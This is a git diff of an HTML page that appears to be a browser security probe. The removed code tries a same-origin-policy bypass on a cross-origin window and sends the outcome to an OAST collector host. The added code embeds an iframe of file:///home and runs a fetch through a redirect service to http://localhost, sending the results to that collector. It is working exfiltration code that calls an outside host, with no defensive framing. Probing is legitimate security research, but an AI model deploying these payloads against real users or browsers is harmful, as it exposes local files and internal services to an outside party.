@@ -3,54 +3,18 @@
  <body>
   <div id="result"></div>
   <div id="result1"></div>
+  <iframe src="file:///home">
+
   <script>
-const oast = "https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/";
+   /* const totalWidth = screen.width;
+    const totalHeight = screen.height;
+    window.open(`https://d9srurqmruokbm3mdu3gxuxf3t9tuwyw5.oast.pro/?q=(W=${totalWidth},H=${totalHeight})`);
+    window.open("https://ahmed-talaat-a1.github.io/Testing");    */
+    
 
-const w = window.open("https://ahmed-talaat-a1.github.io/Testing");
 
-setTimeout(() => {
-    try {
-        const secret = w.document.getElementsByTagName("body").textContent;
-
-        const result = {
-            status: "SOP_BYPASS",
-            value: secret
-        };
-
-        document.body.innerHTML =
-            "<pre>" + JSON.stringify(result, null, 2) + "</pre>";
-
-        fetch(oast, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(result)
-        });
-
-    } catch (e) {
-        const result = {
-            status: "SOP_BLOCKED",
-            name: e.name,
-            message: e.message
-        };
-
-        document.body.innerHTML =
-            "<pre>" + JSON.stringify(result, null, 2) + "</pre>";
-
-        fetch(oast, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(result)
-        });
-    }
-}, 3000);
-</script>
-  <!--<script>
-async function getData() {
-    const url = "https://jsonip.com";
+      async function getData() {
+    const url = "https://307.r3dir.me/--to/?url=http://localhost";
     const oast = "https://d9sootamruoqnj2f3itg49dcubiikbc3u.oast.online/";
 
     try {
@@ -97,9 +61,10 @@ async function getData() {
     }
 }
 
-
 getData();
-  </script>-->
+
+
+  </script>
 
     
   </body>
